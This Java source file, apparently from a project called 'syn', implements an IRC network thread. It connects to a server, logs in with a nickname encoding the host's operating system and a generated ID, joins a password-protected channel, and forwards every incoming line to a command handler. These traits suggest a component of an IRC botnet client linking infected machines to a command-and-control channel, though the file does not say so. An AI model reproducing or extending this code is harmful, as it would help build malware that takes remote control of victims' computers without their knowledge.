package syn.net;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.Socket;
import java.net.URL;
import java.net.UnknownHostException;

import syn.main.Client;
import syn.main.Utilities;
import syn.utils.Settings;

public class NetworkThread implements Runnable {
	
	private String channel;
	private Socket socket;
	private BufferedWriter writer;
	private BufferedReader reader;
	private Utilities uc;
	private String line;
	
	public NetworkThread(String server, String channel, int port) throws Exception {
		this.channel = channel;
		socket = new Socket(server, port);
		writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
		reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		uc = new Utilities();
		line = null;
	}
	
	public static boolean testURL() throws Exception {
	    String strUrl = "http://google.com";
	    URL url = new URL(strUrl);
        HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
	    try {
	        urlConn.connect();
	        return true;
	    } catch (Exception e) {
	    	if(e instanceof UnknownHostException) {
	    		System.out.println("[NET CONN DOWN]");
	    	} else {
	    		if(Settings.debugMode) { e.printStackTrace(); }
	    	}
	        return false;
	    }
	}
	
	public void run() {
		try {
			connect();
		} catch (IOException e) {e.printStackTrace();}
	}
	
	private void connect() throws IOException {	
		String nick = "[" + uc.procOS(Client.os) + "||" + uc.genCode() + "]";
		String login = "synth";

		// Log on to the server.
		writer.write("NICK " + nick + "\r\n");
		writer.write("USER " + login + " 8 * : Synthetic\r\n");
		writer.flush();

		// Read lines from the server until it tells us we have connected.
		while((line = reader.readLine()) != null) {
			Client.getCmdThread().setLine(line);
			if(line.contains("004")) {
				// We are now logged in.
				break;
			} else if (line.indexOf("433") >= 0) {
				//Retry connection with diff nick
				return;
			}
		}

		// Join the channel.
		writer.write("JOIN " + channel + " undressme\r\n");
		writer.flush();
		Client.connected = true;

		// Keep reading lines from the server.
		while((line = reader.readLine()) != null) {
			Client.getCmdThread().setLine(line);
			// Print the raw line received by the bot.
			//TODO: DEBUG 
		}
	}
	
	public void disconnect() {
		try {
			Client.dupePrevent.close();
			socket.close();
			System.exit(0);
		} catch (IOException e) {}
	}
	
	public String getChannel() {
		return channel;
	}
	
	public BufferedWriter getWriter() {
		return writer;
	}
}
